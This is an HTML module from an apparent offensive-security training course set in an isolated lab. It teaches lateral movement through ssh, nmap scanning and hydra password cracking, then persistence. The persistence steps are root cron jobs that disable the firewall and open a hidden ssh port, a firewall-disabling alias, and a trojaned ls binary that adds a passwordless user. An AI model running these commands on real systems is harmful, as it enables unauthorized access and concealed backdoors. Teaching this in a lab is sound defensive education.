  <h1>Welcome to Linux Module E!</h1>
  <h2>The purpose of this module is to further your knowledge of offensive cyber security while building upon prior knowledge.</h2>
  <h3>Like in all default kali instances, your credentials are kali:kali.</h3>
</div>

<div class="lat">
  <p>In this module, we will primarily focus on lateral movement or the way attackers use an initial point of access to access other machines much more easily.</p>
  <p>While this module is an oversimplification of lateral movement, as all virtual machine are in a contained environment, it still provides the basics for how one would go about moving from computer to computer.</p>
  <p>We already covered initial access in the last module, so we will skip over most of that. Run the command ssh cyber@192.168.10.10 to access the initial target machine using ssh. If prompted, input "lonestar" as the password.</p>
  <p>Because of the environment the machines are in, neither can connect to the internet meaning the remote machine cannot install nmap like you would in a real scenario. Luckily, all necessary tools have been installed on that client already.</p>
  <p>Run the command nmap -Pn 192.168.10.0/24 to view the network from this machine's perspective. Run the same command on the kali instance (using a 2nd terminal) and compare the two results.</p>
  <br>
  <p>What ip address shows different results for the kali machine and the remote machine?</p>
  <p>Place the answer in the file called "Forensics.txt"</p>
  <p>❌</p>
  <br>
  <p>We could not obtain access to this Linux machine without first obtaining access to the first target. Now we can use this access to get into the new machine.</p>
  <p>This new computer is running a server installation of Linux meaning it has no graphics. Servers are often always running and contain the most vital data. Because of this, they usually have added protections on them which is why we had to go through the workstation computer to access the server.</p>
  <p>Now that we know the server exists and that its running ssh, we can try to access it from workstation. If we try to access it now, we cannot as we do not have the password. We can do the same thing as we did in module D with hydra though.</p>
  <p>To do this however, we need to find a username that may be on the system. Look around the workstation to see if you can find a username for the server. </p>
  <p>If you cannot find anything, you can always open the file hint.txt on your kali machine. Try to find something first to get a better feel for how an attacker would go about doing this.</p>
  <br>
  <p>What is the username of the server's primary user?</p>
  <p>Place the answer in the file called "Forensics.txt"</p>
  <p>❌</p>
  <br>
  <p>Run the command "hydra -l cyber2 -P /usr/share/wordlists/rockyou.txt ssh://192.168.10.20" to see if we can crack the password.</p>
  <br>
  <p>what is the user's password?</p>
  <p>Place the answer in the file called "Forensics.txt"</p>
  <p>❌</p>
  <br>
  <p>Now we have access to both the server and the workstation. This attack sequence is common in a real scenario as a server is usually the primary objective but it is often not available to just anyone. A server will likely be set up to only allow access to workstations that need it meaning an attacker must compromise those before getting to their true target.</p>
</div>

<div class=persist>
  <p>While we now have access to both the server and the workstation, this access is not permanent. If either of the computers turn off, if either ssh connection is killed, or if firewall rules are changed, we will lose access to these machine. An attacker normally needs a good deal of time to accomplish their goal which is why they establish persistance.</p>
  <p>There are many ways to do this some of which are more complicated than others. In this module, we will cover the more basic methods.</p>
  <p>The easiest method is crontab. Crontab is similar to windows task scheduler in that it performs designated jobs at set times. This utility is very versatile and it comes installed on every Linux version.</p>
  <p>While still logged into to server, elevate to root and enter the command "crontab -e" to enter root's crontab. Type out "* * * * * ufw disable" at the bottom of the file. This line means that the system will, as root, run the command "ufw disable" every minute of every hour of every day of every month and on every day of the week. These are what the asterisks stand for.</p>
  <p>This will turn off the server's firewall allowing you to access it directly. Test this by running the command "ssh cyber2@192.168.10.20" in the kali terminal. </p>
  <p>Next type "1 1 * * 1 echo port 2222 >> /etc/ssh/sshd_config" under the previous line. Remember from module B when we configured ssh? We set the port as 22 by uncommenting the line "port 22" in the file /etc/ssh/sshd_config. This line does a similar thing. It opens a new ssh port on 2222 which is not often checked by a system administrator. This will allow use to use that port rather than 22 to access the server.</p>
  <p>Another thing we can do is create alias. An alias is when you make a simple string or another command into a designated command. Once of the most common commands is the ls command. This command is so common that its mispelling "sl" is also quite common (you may have even typed it yourself a few times).</p>
  <p>Type out the command "nano ~/.bashrc" to enter into root's bashrc file. This file controls aliases. Move to the bottom of the file and type out "alias sl=ufw disable" to set an alias. Now, whenever someone mistypes the command, the firewall will be disabled again. </p>
  <p>Finally, the last method we will cover is modifying binary files. While this sounds challenge (and indeed can become very complex), the way we will be doing it is simple yet still effective.</p>
  <p>Move to /usr/bin where all the binary files all. Once here, run the command "cp ls /lost+found" to move the ls binary to /lost+found. You would normally change the name of the file and move it to a descrete location, but to keep it simple we will stick with /lost+found/ls. Now make a new file in /usr/bin call ls and modify it to contain the lines "#!/bin/bash" "ufw disable" "useradd entry" "clear" "/lost+found/ls" all on different lines</p>
  <p>The first line established the file as a bash script file allowing all the other lines to work. The second line turns off the firewall. The third adds a user named entry with no password which we can use to gain access to the server easier. The fourth line clear the terminal so that this modification is harder to detect. Finally, the last line runs the actual ls binary so the command seems to act as normal.</p>
  <p>When combined, these methods ensure that we always have access to the server especially since it is configured to run indefinitely like most servers.</p>

  <h2>Congratulations on completing Linux Module E!</h2>
  <h3>You now have a better understanding of how an attacker would think and act while also knowing where to look in your own computer for signs of an attack. This is the final Linux module. If you would like more practice, you may use any of the environments or make your one to learn more about kali's tools or about applications commonly run on Linux.</h3>
